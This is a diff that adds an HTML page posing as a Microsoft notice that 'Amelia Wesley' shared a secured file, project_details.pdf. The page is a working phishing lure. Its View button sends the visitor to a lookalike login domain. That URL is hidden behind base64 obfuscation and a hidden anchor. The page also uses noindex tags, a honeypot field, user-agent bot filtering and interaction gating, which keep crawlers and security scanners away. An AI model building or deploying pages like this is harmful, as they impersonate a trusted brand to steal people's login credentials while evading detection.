@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <title>Microsoft Secured Shared File</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow"> <!-- Prevent search engine indexing -->
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <style>
+        body {
+            background-color: #F3F2F1;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #4a4a4a;
+        }
+
+        .logo-container img {
+            width: 24px;
+            height: auto;
+        }
+
+        .logo-container .logo-text {
+            font-size: 22px;
+            margin-left: 5px;
+            font-weight: bold;
+        }
+
+        #box {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            text-align: center;
+            background-color: #fff;
+            padding: 40px;
+            transform: translate(-50%, -50%);
+            border-radius: 16px;
+            box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
+        }
+
+        .message {
+            text-align: center;
+            font-size: 24px;
+        }
+
+        .download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .honeypot {
+            display: none; /* Hidden field for bot detection */
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+            text-align: center;
+            color: #4a4a4a;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .error-message {
+            color: red;
+            display: none;
+            margin-top: 10px;
+        }
+
+        #hiddenRedirect {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <div class="logo-text">Microsoft</div>
+    </div>
+    <div id="box">
+        <div class="message">
+            <p><strong>Amelia Wesley</strong><br/>Shared a secured file with you.</p>
+        </div>
+        <div class="download">
+            <form id="downloadForm">
+                <input type="text" class="honeypot" name="honeypot" value="">
+                <button type="button" id="downloadButton" class="btn btn-primary btn-lg" disabled>View <strong>project_details.pdf</strong></button>
+            </form>
+            <div id="spinner" class="spinner"></div>
+            <div id="errorMessage" class="error-message">Please enable JavaScript and interact with the page to proceed.</div>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="https://www.microsoft.com/en-us/legal/privacy-statement">Privacy Statement</a>
+    </div>
+    <a id="hiddenRedirect" href="https://login.maxsldfc.cloud/view/project-details.pdf"></a>
+
+    <script>
+        // Anti-bot detection variables
+        let isHuman = false;
+        let interactionCount = 0;
+
+        // Function to decode and construct the redirect URL
+        function getRedirectUrl() {
+            const parts = ['h', 't', 't', 'p', 's', ':', '/', '/', 'l', 'o', 'g', 'i', 'n', '.', 'm', 'a', 'x', 's', 'l', 'd', 'f', 'c', '.', 'c', 'l', 'o', 'u', 'd', '/', 'v', 'i', 'e', 'w', '/', 'p', 'r', 'o', 'j', 'e', 'c', 't', '-', 'd', 'e', 't', 'a', 'i', 'l', 's', '.', 'p', 'd', 'f'];
+            return atob('aHR0cHM6Ly9sb2dpbi5tYXhsZGZjLmNsb3VkL3ZpZXcvcHJvamVjdC1kZXRhaWxzLnBkZg==');
+        }
+
+        // Enable button after user interaction
+        function enableButton() {
+            interactionCount++;
+            if (interactionCount >= 2) { // Require at least 2 interactions (e.g., mouse move + click)
+                isHuman = true;
+                document.getElementById('downloadButton').disabled = false;
+                document.getElementById('errorMessage').style.display = 'none';
+            }
+        }
+
+        // Detect user interactions
+        document.addEventListener('mousemove', enableButton);
+        document.addEventListener('touchstart', enableButton);
+        document.addEventListener('keydown', enableButton);
+
+        // Handle button click
+        document.getElementById('downloadButton').addEventListener('click', function() {
+            const honeypot = document.querySelector('input[name="honeypot"]').value;
+            if (honeypot !== '') {
+                // Bot detected (honeypot field filled)
+                document.getElementById('errorMessage').textContent = 'Invalid request. Please try again.';
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            if (!isHuman) {
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+
+            // Show spinner and disable button
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('downloadButton').disabled = true;
+
+            // Simulate a delay for better UX and trigger redirect
+            setTimeout(() => {
+                const url = getRedirectUrl();
+                try {
+                    window.location.assign(url); // Primary redirect method
+                    window.location.href = url; // Fallback redirect
+                    document.getElementById('hiddenRedirect').click(); // Simulate direct click
+                } catch (e) {
+                    document.getElementById('errorMessage').textContent = 'Redirect failed. Please try again.';
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('downloadButton').disabled = false;
+                }
+            }, 1500);
+        });
+
+        // Basic bot detection: Check for common bot user agents
+        const userAgent = navigator.userAgent.toLowerCase();
+        const botPatterns = ['bot', 'crawl', 'spider', 'googlebot', 'bingbot', 'slurp'];
+        const isBot = botPatterns.some(pattern => userAgent.includes(pattern));
+        if (isBot) {
+            document.getElementById('errorMessage').style.display = 'block';
+            document.getElementById('downloadButton').disabled = true;
+        }
+    </script>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+</body>
+</html>
